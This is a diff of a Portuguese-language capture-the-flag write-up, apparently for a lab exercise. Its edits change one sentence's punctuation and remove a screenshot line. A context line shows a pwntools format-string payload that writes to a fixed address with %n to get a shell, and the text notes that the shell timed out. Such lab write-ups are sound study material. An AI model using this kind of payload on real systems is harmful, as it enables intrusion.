@@ -30,9 +30,8 @@ p.sendline(b"AAAA\x1F\xB3\x04\x08%.12513024x%n")
 p.interactive()
 ```
 
-Agora a shell já era lançada só que vinha logo com um timeout, por causa do elevado número de caracteres (mais de 12 milhões) escritos:
+Agora a shell já era lançada só que vinha logo com um timeout, por causa do elevado número de caracteres (mais de 12 milhões) escritos.
 
-<img src="../screenshots/ctf7/try2.png" alt="try">
 
 ### Tentativa 3
 
